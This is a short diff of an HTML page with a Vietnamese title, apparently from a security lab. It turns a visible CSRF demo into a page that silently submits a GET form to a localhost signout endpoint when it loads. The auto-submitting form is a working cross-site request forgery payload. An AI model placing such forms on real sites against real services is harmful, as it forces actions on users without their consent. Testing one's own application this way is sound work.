@@ -1,13 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-  <title>CSRF đăng xuất</title>
+  <meta charset="UTF-8" />
+  <title>CSRF đăng xuất tự động</title>
 </head>
-<body>
-  <h2>Trang giả mạo CSRF đăng xuất</h2>
-
-  <!-- Form đăng xuất -->
-  <form id="logoutForm" action="http://localhost:8080/signout" method="GET">
-  </form>
+<body onload="document.getElementById('logoutForm').submit()">
+  <form id="logoutForm" action="http://localhost:8080/signout" method="GET"></form>
 </body>
 </html>
